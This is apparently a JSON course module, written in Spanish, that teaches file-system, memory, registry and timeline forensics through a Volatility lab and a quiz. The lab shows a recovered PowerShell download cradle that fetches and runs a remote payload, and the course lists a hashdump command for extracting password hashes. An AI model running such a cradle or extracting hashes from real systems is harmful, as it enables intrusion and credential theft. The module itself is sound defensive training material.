[
  {
    "screen_id": 1,
    "type": "story_hook",
    "title": "Caso Real: Memory Forensics Reveals APT",
    "duration": 120,
    "content": {
      "case_name": "APT Memory-Only Malware Investigation",
      "date": "2018",
      "image_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/db/Computer_memory_types.svg/1200px-Computer_memory_types.svg.png",
      "narrative": "Empresa detecta exfiltración de datos pero no encuentra malware en disco. Atacante usaba fileless malware que vivía solo en RAM. Análisis de memory dump reveló: PowerShell code injection, proceso oculto, conexiones de red activas, credenciales en cleartext. Sin memory forensics, ataque habría quedado sin resolver.",
      "stats": [
        {"label": "Tiempo en Memoria", "value": "6 meses", "icon": "schedule"},
        {"label": "Archivos en Disco", "value": "0", "icon": "storage"},
        {"label": "Detección", "value": "Memory Forensics", "icon": "memory"}
      ]
    }
  },
  {
    "screen_id": 2,
    "type": "theory_tabs",
    "title": "File System Forensics",
    "content": {
      "intro": "Análisis de sistemas de archivos para recuperar evidencia y reconstruir actividad.",
      "tabs": [
        {
          "label": "NTFS",
          "title": "NT File System (Windows)",
          "text": "Master File Table (MFT): registro de cada archivo. $MFT contiene metadata: nombre, tamaño, timestamps (MAC: Modified, Accessed, Created), atributos, ubicación en disco. Alternate Data Streams (ADS) pueden ocultar datos.",
          "icon": "folder"
        },
        {
          "label": "Timestamps",
          "title": "MAC Times Analysis",
          "text": "Modified: contenido cambió. Accessed: archivo leído (puede ser deshabilitado). Created: archivo creado (en NTFS, puede ser MFT entry creation). Birth: creación real. MACB timeline para reconstruir actividad.",
          "icon": "schedule"
        },
        {
          "label": "Deleted Files",
          "title": "Recuperación de Archivos Borrados",
          "text": "Delete no borra datos, marca espacio como disponible. MFT entry marcada como deleted. Datos persisten hasta sobrescritura. File carving: buscar headers/footers conocidos (JPG, PDF, DOCX) en unallocated space.",
          "icon": "restore_from_trash"
        },
        {
          "label": "Artifacts",
          "title": "Windows Artifacts",
          "text": "Prefetch (apps ejecutadas), Shimcache (AppCompatCache - programas ejecutados), Amcache (instalación de apps), LNK files (atajos - acceso a archivos), Jump Lists, USN Journal (cambios en volumen NTFS).",
          "icon": "inventory_2"
        }
      ]
    }
  },
  {
    "screen_id": 3,
    "type": "theory_section",
    "title": "Memory Forensics - Volatility",
    "content": {
      "intro": "Análisis de RAM dump para evidencia volátil: procesos, network connections, malware, credenciales.",
      "why_important": "Fileless malware no toca disco. Vive en RAM (PowerShell, DLLs inyectadas). Process hollowing, code injection. Memory es donde ocurre la acción.",
      "tools": {
        "name": "Volatility Framework",
        "description": "Open-source memory forensics. Soporta Windows, Linux, Mac. Python-based.",
        "plugins": [
          {
            "plugin": "pslist / pstree",
            "purpose": "Listar procesos en ejecución. Detectar procesos ocultos.",
            "command": "volatility -f memory.dmp --profile=Win10x64 pslist"
          },
          {
            "plugin": "netscan",
            "purpose": "Conexiones de red activas y listening ports. Encuentra C2 connections.",
            "command": "volatility -f memory.dmp --profile=Win10x64 netscan"
          },
          {
            "plugin": "malfind",
            "purpose": "Buscar code injection, memory segments con permisos sospechosos (RWX).",
            "command": "volatility -f memory.dmp --profile=Win10x64 malfind"
          },
          {
            "plugin": "hashdump",
            "purpose": "Extraer password hashes de SAM (Windows).",
            "command": "volatility -f memory.dmp --profile=Win10x64 hashdump"
          },
          {
            "plugin": "cmdscan / consoles",
            "purpose": "Comandos ejecutados en cmd.exe o PowerShell. Detecta attacker commands.",
            "command": "volatility -f memory.dmp --profile=Win10x64 cmdscan"
          }
        ]
      },
      "analysis_workflow": [
        "1. Identificar profile correcto (OS version)",
        "2. Listar procesos (pslist) - buscar sospechosos",
        "3. Analizar network (netscan) - IPs externas, puertos raros",
        "4. Buscar code injection (malfind)",
        "5. Extraer proceso sospechoso (procdump)",
        "6. Analizar strings, dlls cargadas (dlllist)"
      ]
    }
  },
  {
    "screen_id": 4,
    "type": "theory_section",
    "title": "Registry Forensics",
    "content": {
      "intro": "Windows Registry contiene configuración del sistema, users, apps instaladas. Evidencia forense rica.",
      "hives": [
        {"hive": "SAM", "location": "C:\\Windows\\System32\\config\\SAM", "contains": "User accounts, password hashes"},
        {"hive": "SECURITY", "location": "C:\\Windows\\System32\\config\\SECURITY", "contains": "Security policies, cached domain credentials"},
        {"hive": "SOFTWARE", "location": "C:\\Windows\\System32\\config\\SOFTWARE", "contains": "Installed software, autorun programs"},
        {"hive": "SYSTEM", "location": "C:\\Windows\\System32\\config\\SYSTEM", "contains": "System config, network config, services"},
        {"hive": "NTUSER.DAT", "location": "C:\\Users\\[user]\\NTUSER.DAT", "contains": "User-specific settings, recent docs"}
      ],
      "forensic_keys": [
        {
          "key": "Run / RunOnce",
          "path": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
          "evidence": "Programas que ejecutan al boot. Malware usa esto para persistencia."
        },
        {
          "key": "MRU (Most Recently Used)",
          "path": "NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer",
          "evidence": "Archivos recientes, búsquedas, typed URLs."
        },
        {
          "key": "USB Devices",
          "path": "SYSTEM\\CurrentControlSet\\Enum\\USBSTOR",
          "evidence": "USBs conectados, serial numbers, last connect time."
        },
        {
          "key": "Network History",
          "path": "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList",
          "evidence": "Redes WiFi a las que se conectó."
        }
      ]
    }
  },
  {
    "screen_id": 5,
    "type": "practical_lab",
    "title": "Lab: Análisis de Memory Dump",
    "content": {
      "scenario": "Tienes memory dump de 4GB de sistema comprometido. Usa Volatility para investigar.",
      "simulation": {
        "memory_file": "infected.dmp",
        "profile": "Win10x64_19041",
        "tasks": [
          {
            "task": "Identificar procesos sospechosos",
            "command": "volatility -f infected.dmp --profile=Win10x64_19041 pslist",
            "output_excerpt": "PID 4820 - powershell.exe (PPID: 3012 - svchost.exe)\nPID 5124 - cmd.exe (PPID: 4820)\nPID 5328 - svchost.exe (no standard parent, hidden)",
            "analysis": "PowerShell spawned by svchost es sospechoso. Cmd.exe hijo de PowerShell indica scripting. svchost con parent anómalo es red flag."
          },
          {
            "task": "Analizar conexiones de red",
            "command": "volatility -f infected.dmp --profile=Win10x64_19041 netscan",
            "output_excerpt": "PID 5328 - svchost.exe - TCP 192.168.1.50:49234 -> 45.142.212.88:443 ESTABLISHED",
            "analysis": "Conexión a IP externa sospechosa (Tor exit node). Puerto 443 para parecer HTTPS pero proceso es svchost anómalo."
          },
          {
            "task": "Buscar code injection",
            "command": "volatility -f infected.dmp --profile=Win10x64_19041 malfind -p 5328",
            "output_excerpt": "Process: svchost.exe PID: 5328\nAddress: 0x02a30000\nFlags: PAGE_EXECUTE_READWRITE\nProtect: VirtualAllocEx injected",
            "analysis": "Memory region con RWX (Read-Write-Execute) es anómalo. Indica code injection. Malware inyectó código en proceso legítimo."
          },
          {
            "task": "Extraer comandos PowerShell",
            "command": "volatility -f infected.dmp --profile=Win10x64_19041 consoles",
            "output_excerpt": "IEX (New-Object Net.WebClient).DownloadString('http://45.142.212.88/payload')",
            "analysis": "PowerShell descargó y ejecutó payload remoto. Técnica de fileless malware."
          }
        ]
      },
      "conclusion": "Evidencia encontrada: Process injection, C2 connection, PowerShell download cradle. APT fileless malware confirmado."
    }
  },
  {
    "screen_id": 6,
    "type": "theory_section",
    "title": "Timeline Analysis",
    "content": {
      "concept": "Reconstruir cronología de eventos para entender secuencia de ataque.",
      "sources": [
        "File system timestamps (MAC times)",
        "Registry keys (last write time)",
        "Event logs (Security, System, Application)",
        "Prefetch files (last execution)",
        "Browser history",
        "Memory artifacts"
      ],
      "tools": [
        {"tool": "log2timeline / Plaso", "description": "Genera super timeline de múltiples fuentes. Output CSV/JSON."},
        {"tool": "Timeline Explorer", "description": "Visualiza timelines, filtra eventos."}
      ],
      "workflow": [
        "1. Recolectar timestamps de todas las fuentes",
        "2. Normalizar a UTC",
        "3. Agregar en timeline único",
        "4. Filtrar ruido (system processes normales)",
        "5. Identificar pivot points (primera acción sospechosa, lateral movement, exfiltración)"
      ],
      "example_timeline": [
        {"time": "2024-11-20 14:23:15", "event": "phishing.docx opened by user"},
        {"time": "2024-11-20 14:23:47", "event": "powershell.exe spawned by WINWORD.EXE"},
        {"time": "2024-11-20 14:24:02", "event": "Connection to 45.142.212.88:443"},
        {"time": "2024-11-20 14:35:18", "event": "Lateral movement: SMB to DC01"},
        {"time": "2024-11-20 15:12:44", "event": "Data staged in C:\\temp\\exfil.zip"},
        {"time": "2024-11-20 16:08:33", "event": "Large upload to 45.142.212.88"}
      ]
    }
  },
  {
    "screen_id": 7,
    "type": "quiz",
    "title": "Evaluación - Análisis Forense Avanzado",
    "content": {
      "question": "¿Por qué memory forensics es crítico para detectar fileless malware?",
      "options": [
        {"id": "a", "text": "Fileless malware vive solo en RAM, no escribe archivos al disco, no detectable con disk forensics", "is_correct": true, "feedback": "Correcto. Fileless usa PowerShell, WMI, código inyectado en memoria. Sin memory dump, no hay evidencia."},
        {"id": "b", "text": "Memory forensics es más rápido que disk forensics", "is_correct": false, "feedback": "No. Velocidad no es la razón. Es porque fileless NO está en disco."},
        {"id": "c", "text": "Memory contiene contraseñas en cleartext", "is_correct": false, "feedback": "Parcial. Sí puede contener credenciales, pero no es la razón principal para fileless detection."}
      ]
    }
  }
]